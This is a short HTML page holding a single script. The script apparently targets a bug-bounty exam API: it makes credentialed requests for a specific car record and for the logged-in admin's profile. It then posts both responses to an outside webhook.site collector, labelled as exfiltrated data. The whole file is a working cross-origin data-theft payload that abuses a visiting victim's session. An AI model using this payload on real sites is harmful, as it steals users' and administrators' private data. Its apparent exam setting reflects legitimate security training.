<!DOCTYPE html>
<html>
<body>
    <script>
        const myWebhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        // Targeting the specific car ID from your earlier console log
        const targetCarId = "69dd6987c0d4316bd884dd654"; 

        // 1. Fetch the FULL data for this specific car
        fetch(`https://api-bugbounty-exam.hashacademy.co/api/cars/${targetCarId}`, {
            credentials: "include"
        })
        .then(res => res.json())
        .then(data => {
            fetch(myWebhook, {
                method: "POST",
                body: JSON.stringify({ 
                    type: "CAR_ID_EXFIL", 
                    details: data 
                })
            });
        });

        // 2. Also fetch the admin's own profile to check for global flags
        fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
            credentials: "include"
        })
        .then(res => res.json())
        .then(data => {
            fetch(myWebhook, {
                method: "POST",
                body: JSON.stringify({ type: "ADMIN_ME", admin: data })
            });
        });
    </script>
</body>
</html>
